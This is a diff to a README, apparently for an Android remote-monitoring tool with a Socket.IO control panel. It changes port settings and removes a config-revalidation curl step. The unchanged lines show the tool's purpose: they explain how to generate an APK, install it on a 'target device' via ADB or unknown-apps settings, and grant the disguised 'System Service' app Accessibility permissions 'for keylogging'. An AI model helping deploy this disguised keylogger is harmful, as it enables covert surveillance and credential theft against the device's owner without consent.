@@ -62,11 +62,10 @@ This project uses Docker for the frontend (nginx + static files) and server (Soc
    docker compose up --build
    ```
 
-- Server runs Socket.IO on http://localhost:4000
-- Nginx serves the frontend on http://localhost:4001
+- Nginx serves the frontend and proxies the socket.io server on http://localhost:4000
 
 ### 3. Access the Control Panel
-1. Open http://localhost:4001 in your browser.
+1. Open http://localhost:4000 in your browser.
 2. The dashboard will list connected devices.
 
 ### 4. Generate and Deploy APK
@@ -74,15 +73,6 @@ This project uses Docker for the frontend (nginx + static files) and server (Soc
 2. Download the generated APK from the UI link.
 3. Install on target device (enable "Install unknown apps" or use ADB: `adb install app-debug.apk`).
 4. Grant Accessibility permissions to the "System Service" app for keylogging.
-
-### 5. Trigger Config Revalidation (Optional)
-Send a POST request to trigger all connected apps to revalidate their configuration:
-
-```bash
-curl -X POST http://localhost:4000/api/validate-config
-```
-
-This is useful when you update your `settings.json` and want apps to pick up changes immediately.
 
 ## Configuration Update Workflow
 
